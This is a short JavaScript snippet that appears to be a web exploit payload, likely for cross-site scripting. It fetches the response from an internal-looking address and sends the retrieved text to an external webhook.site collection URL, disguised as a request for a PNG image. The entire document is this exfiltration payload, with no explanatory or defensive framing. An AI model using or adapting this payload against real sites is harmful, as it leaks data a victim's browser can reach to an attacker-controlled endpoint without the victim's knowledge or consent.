
fetch("http://123").then((res) => {
	return res.text();
}).then(data => {
	fetch("https://webhook.site/dca2f591-eb3a-47f9-8f5f-c5c2d1c0116d/a.png?data="+data);
})
